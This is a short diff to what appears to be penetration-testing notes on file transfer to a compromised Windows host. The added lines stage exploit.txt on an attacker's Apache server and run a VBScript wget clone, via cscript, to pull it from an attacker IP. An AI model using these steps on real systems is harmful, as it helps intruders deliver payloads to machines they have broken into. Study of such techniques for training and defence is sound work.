@@ -38,5 +38,17 @@ C:\Program Files\SLmail\System>ftp -s:ftp.txt
 ```
 
 ## VBScript
+Often installed we can mimick wget using this script
+
+Linux (attacker)
+```
+cp exploit.txt /var/www/exploit.txt
+service apache2 start
+```
+
+Windows (Defender) - Paste `wget-vbs.txt` into the shell then use
+```
+cscript wget.vbs http://10.11.0.138/test.txt testvbs.txt
+```
 
 ## Powershell
